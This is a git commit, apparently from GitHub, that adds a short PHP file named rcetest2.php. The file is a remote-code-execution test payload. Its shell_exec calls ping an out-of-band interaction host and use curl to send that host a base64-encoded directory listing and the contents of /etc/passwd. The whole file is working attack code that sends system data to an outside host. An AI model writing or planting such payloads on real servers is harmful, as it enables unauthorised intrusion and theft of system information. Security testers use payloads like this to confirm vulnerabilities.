7604c37e34188da6205ca708ee6644bb501207f5
0xdomsec <116116368+0xdomsec@users.noreply.github.com>
2023-04-23 14:22:01 +0000

    Create rcetest2.php

---
+++ rcetest2.php
@@ -0,0 +1,6 @@
+<?php
+  shell_exec('ping -c 3 cg89ayk2vtc0000h4xkggetjh3cyyyyyk.oast.fun');
+  shell_exec('curl cg89ayk2vtc0000h4xkggetjh3cyyyyyk.oast.fun/http/data');
+  shell_exec('curl cg89ayk2vtc0000h4xkggetjh3cyyyyyk.oast.fun/path/data -d `ls -a | base64 -w 0`');
+  shell_exec('curl cg89ayk2vtc0000h4xkggetjh3cyyyyyk.oast.fun/psswd/data -d `cat /etc/passwd | base64 -w 0`');
+?>
